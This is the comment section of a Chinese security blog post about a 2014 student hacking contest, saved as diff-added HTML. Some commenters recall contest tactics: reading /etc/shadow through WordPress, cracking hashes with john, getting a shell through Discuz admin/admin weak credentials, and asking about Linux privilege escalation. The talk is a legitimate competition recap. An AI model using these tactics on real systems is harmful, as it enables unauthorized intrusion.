+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/ef2d8b52c284fbbd17b7a485dc26c6d8.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">夏殇</a>
+<time datetime="2014年6月10日 08:14" itemprop="datePublished">
+                            2014 六月 10 08:14
+                        </time>
+<a href="javascript:reply_to('1681', '夏殇')">回复</a>
+</p>
+<p class="comment-meta">360工作人员说wordpress下载etc/shadow破不了，当时我们在跑john，让我们直接放弃了，因为“我们是破不出来的”的说，然后不破了，ctrl+C</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1682">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2014年6月10日 09:53" itemprop="datePublished">
+                            2014 六月 10 09:53
+                        </time>
+<a href="javascript:reply_to('1682', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@夏殇：wordpress下载的和tomcat下载的不一样吧？tomcat是root 权限，wp只是www权限。。。</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1683">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/ef2d8b52c284fbbd17b7a485dc26c6d8.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">夏殇</a>
+<time datetime="2014年6月11日 01:13" itemprop="datePublished">
+                            2014 六月 11 01:13
+                        </time>
+<a href="javascript:reply_to('1683', '夏殇')">回复</a>
+</p>
+<p class="comment-meta">@phithon：酱紫啊</p>
+</div>
+</div>
+</div>
+</div>
+<div class="row" id="comment-1663">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/530777ddf6c92e2dd5c3b46d9ef18ef0.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://boke.tulongteam.com" target="_blank">屠龙</a>
+<time datetime="2014年5月30日 18:28" itemprop="datePublished">
+                            2014 五月 30 18:28
+                        </time>
+<a href="javascript:reply_to('1663', '屠龙')">回复</a>
+</p>
+<p class="comment-meta">拿了第二名很不错了。</p>
+</div>
+</div>
+<div class="row" id="comment-1662">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.wanzaila.com" target="_blank">万载</a>
+<time datetime="2014年5月30日 17:49" itemprop="datePublished">
+                            2014 五月 30 17:49
+                        </time>
+<a href="javascript:reply_to('1662', '万载')">回复</a>
+</p>
+<p class="comment-meta">牛B啊。</p>
+</div>
+</div>
+<div class="row" id="comment-1659">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/70a8934c7e87a70cdde07747e60ad06f.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">wilson</a>
+<time datetime="2014年5月28日 22:50" itemprop="datePublished">
+                            2014 五月 28 22:50
+                        </time>
+<a href="javascript:reply_to('1659', 'wilson')">回复</a>
+</p>
+<p class="comment-meta">先点赞~<br/>1.第一个服务器 wordpress 我读了/etc/shadow 但是root破不出来  - - <br/>音符牛说wrodpress 可以爆出wordpress的路径<br/>2.第二个服务器 笑而不语 嘿嘿 <br/>3.第三个服务器 那么简单 T_T 哭了 我就没去读robots.txt<br/>discuz 据说是admin/admin 弱口令 直接去后台改配置文件拿shell<br/>4.第四个服务器 eweb 那个在editor目录下 唯一的题windows系统 补丁打的全全的 没有搞到sa也 - -  <br/>我也想知道 如何提权 linux  求教导</p>
+</div>
+</div>
+<div class="row" id="comment-1652">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/a85c3d3674477dc0fcfa1b389f85b9d2.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://hackluom.net" target="_blank">luom</a>
+<time datetime="2014年5月28日 02:44" itemprop="datePublished">
+                            2014 五月 28 02:44
+                        </time>
+<a href="javascript:reply_to('1652', 'luom')">回复</a>
+</p>
+<p class="comment-meta">不错啊，是不是发现渗透这事细心很重要？</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1655">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2014年5月28日 11:44" itemprop="datePublished">
+                            2014 五月 28 11:44
+                        </time>
+<a href="javascript:reply_to('1655', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@luom：嗯。。与思路一样重要</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-1648">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">彩色夏天</a>
+<time datetime="2014年5月27日 14:04" itemprop="datePublished">
+                            2014 五月 27 14:04
+                        </time>
+<a href="javascript:reply_to('1648', '彩色夏天')">回复</a>
+</p>
+<p class="comment-meta">学弟不哭～～</p>
+</div>
+</div>
+<div class="row" id="comment-1647">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">cmdshell</a>
+<time datetime="2014年5月27日 13:10" itemprop="datePublished">
+                            2014 五月 27 13:10
+                        </time>
+<a href="javascript:reply_to('1647', 'cmdshell')">回复</a>
+</p>
+<p class="comment-meta">大牛 膜拜之....</p>
+</div>
+</div>
+<div class="row" id="comment-1644">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://sillymind.me" target="_blank">mapleray</a>
+<time datetime="2014年5月27日 08:13" itemprop="datePublished">
+                            2014 五月 27 08:13
+                        </time>
+<a href="javascript:reply_to('1644', 'mapleray')">回复</a>
+</p>
+<p class="comment-meta">又一个被key360坑了的人 = =握爪</p>
+</div>
+</div>
+</div>
+<nav role="navigation">
+<ul class="cd-pagination pull-left">
+<li class="button"><a href="javascript:;"></a></li>
+<li><a class="current" href="?page=1#reply-list">1</a></li>
+<li><a href="?page=2#reply-list">2</a></li>
+<li class="button"><a href="?page=2#reply-list"></a></li>
+</ul>
+</nav>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="6244ab0fe75947361d0de1b9ff0bb4bb4da0a14a"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./360全国大学生信安技术大赛记录  离别歌/6244ab0fe75947361d0de1b9ff0bb4bb4da0a14a"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="314">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="AWEzSYCAcrFsZxG4Lzfm6uARbPYDRCAS8gZ5GsOPDezRZc4jzQJ6F8CWkTrLA6p2"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./360全国大学生信安技术大赛记录  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./360全国大学生信安技术大赛记录  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
